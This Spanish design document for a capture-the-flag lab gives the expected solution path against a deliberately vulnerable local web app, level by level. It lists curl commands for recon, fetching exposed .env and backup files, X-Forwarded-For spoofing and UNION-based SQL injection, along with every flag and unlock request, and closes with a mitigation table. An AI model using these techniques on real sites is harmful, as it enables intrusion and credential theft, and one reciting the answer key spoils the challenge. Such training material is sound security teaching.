# Ruta de explotacion esperada

Documento tecnico del CTO. Describe la cadena de exposicion completa, nivel a nivel,
con los comandos que el participante puede usar y el resultado esperado.

> Material de administracion y de diseno. Toda la informacion es ficticia.

## Resumen de la cadena

```
recon (headers, robots, sitemap)
   └─> directory listing (/files, /backup, /old)
         └─> informacion de desarrolladores (/files/internal)
               └─> secretos senuelo (/.env, /files/config)
                     └─> SQLi en /api/search -> base de datos
                           └─> combinacion final de las 5 flags
```

## Nivel 1 — Reconocimiento (FLAG{RECON_COMPLETE}, 10 pts)

**Superficie:** `http://localhost:8080`.

```bash
curl -I http://localhost:8080/api/health
curl -s http://localhost:8080/robots.txt
curl -s http://localhost:8080/sitemap.xml
curl -s http://localhost:8080/server-status
```

**Hallazgos esperados:**
- `Server: nginx/1.27.5` (version filtrada).
- `X-DevCore-Build: dc-api-2024.11-rc2` y `X-Powered-By: Flask/3.0 (DevCore)`.
- `robots.txt` menciona `/admin/`, `/backup/`, `/old/`, `/files/config/`, `/api/internal/`.
- `sitemap.xml` lista las rutas publicas.
- `stub_status` expuesto.

**Evidencia del nivel:** `dc-api-2024.11-rc2`.

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":1,"evidence":"dc-api-2024.11-rc2"}'
```

**Control de acceso roto (extra):** el API confia en `X-Forwarded-For`.

```bash
curl -s -H 'X-Forwarded-For: 127.0.0.1' http://localhost:8080/api/internal/recon-report
```

## Nivel 2 — Enumeracion de directorios (FLAG{DIRECTORY_DISCOVERED}, 20 pts)

```bash
curl -s http://localhost:8080/files/
curl -s http://localhost:8080/backup/
curl -s http://localhost:8080/old/
curl -s http://localhost:8080/files/internal/
curl -s http://localhost:8080/files/temp/
```

**Hallazgos esperados:** directorios `backups/`, `config/`, `internal/`, `old/`, `temp/`;
backups `devcore_archive_20241031.tar.gz`, `db_backup_20241028.sql.bak`,
`nginx.conf.bak`; logs temporales.

**Evidencia del nivel:** el nombre del archivo de respaldo
`devcore_archive_20241031.tar.gz`.

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":2,"evidence":"devcore_archive_20241031.tar.gz"}'
```

## Nivel 3 — Exposicion de informacion de desarrolladores (FLAG{DEVELOPER_EXPOSED}, 20 pts)

```bash
curl -s http://localhost:8080/files/internal/README-dev.md
curl -s http://localhost:8080/files/internal/team-notes.txt
curl -s http://localhost:8080/files/internal/repo-structure.txt
curl -s http://localhost:8080/team
curl -s http://localhost:8080/ | grep -i 'ostermann'
```

**Hallazgos esperados:** alias y correos ficticios, estructura del repositorio, notas
tecnicas, comentarios HTML con el responsable del despliegue y recordatorios de
seguridad ("retirar /files", "rotar claves").

**Evidencia del nivel:** el alias `s.ostermann`.

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":3,"evidence":"s.ostermann"}'
```

## Nivel 4 — Descubrimiento de secretos (FLAG{SECRET_FOUND}, 30 pts)

```bash
curl -s http://localhost:8080/.env
curl -s http://localhost:8080/files/config/.env.bak
curl -s http://localhost:8080/files/config/app-config.json
curl -s http://localhost:8080/files/config/database.yml.bak
curl -s http://localhost:8080/api/config
```

**Hallazgos esperados:** `DEVCORE_API_KEY` (senuelo), `JWT_SECRET` (senuelo),
credenciales de base de datos ficticias, rutas de backup y del dashboard interno.

**Evidencia del nivel:** la API key senuelo
`dc_live_9f4e2b7a6c8d1e3f5a7b9c2d4e6f8a0b`.

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":4,"evidence":"dc_live_9f4e2b7a6c8d1e3f5a7b9c2d4e6f8a0b"}'
```

> Todas las credenciales son ficticias y no sirven para autenticar en ningun servicio real.

## Nivel 5 — Investigacion de base de datos (FLAG{DATABASE_COMPROMISED}, 40 pts)

La API recibe el parametro `q` y lo concatena al SQL sin sanitizar.

```bash
# error que delata la inyeccion
curl -s -G --data-urlencode "q=' ORDER BY 999 -- " http://localhost:8080/api/search

# union-based: la tabla internal_flags contiene la flag del nivel
curl -s -G \
  --data-urlencode "q=' UNION SELECT level, flag, points::text FROM internal_flags -- " \
  http://localhost:8080/api/search
```

**Resultado esperado:** la respuesta incluye
`FLAG{DATABASE_COMPROMISED}` en la columna `name`.

**Nota tecnica:** la tercera columna de la consulta base es `VARCHAR` y `points` es
`INT`; por eso el payload castea `points::text`. El participante descubre el desajuste
de tipos desde el mensaje de error.

**Validacion:**

```bash
curl -s -X POST http://localhost:8080/api/flags/validate \
  -H 'Content-Type: application/json' \
  -d '{"flag":"FLAG{DATABASE_COMPROMISED}"}'
```

## Nivel 6 — Root / flag final (FLAG{DEVELOPER_SECRETS_ROOT}, 50 pts)

Requiere relacionar los cinco hallazgos anteriores y entregarlos **en orden**.

```bash
curl -s -X POST http://localhost:8080/api/flags/unlock \
  -H 'Content-Type: application/json' \
  -d '{"level":6,"flags":[
        "FLAG{RECON_COMPLETE}",
        "FLAG{DIRECTORY_DISCOVERED}",
        "FLAG{DEVELOPER_EXPOSED}",
        "FLAG{SECRET_FOUND}",
        "FLAG{DATABASE_COMPROMISED}"
      ]}'
```

**Verificacion final:**

```bash
curl -s http://localhost:8080/api/flags/progress
# {"solved":[1,2,3,4,5,6],"score":170,"total_levels":6}
```

## Defensas que faltan (lecciones)

| Observacion | Mitigacion |
|---|---|
| `server_tokens on` y `stub_status` abierto | `server_tokens off`; restringir `/server-status` |
| `autoindex on` y alias a directorios internos | desactivar `autoindex`; no publicar `/files`, `/backup`, `/old` |
| `.env` y backups servidos desde el borde | filtrar extensiones sensibles; tambien en el SG |
| Informacion de desarrolladores en el HTML | retirar comentarios internos del codigo producido |
| Confianza en `X-Forwarded-For` | validar el origen real; no confiar en cabeceras inyectables |
| SQL por concatenacion | consultas parametrizadas / ORM |
| Secretos en texto plano | gestor de secretos; rotacion; nunca en el repositorio |
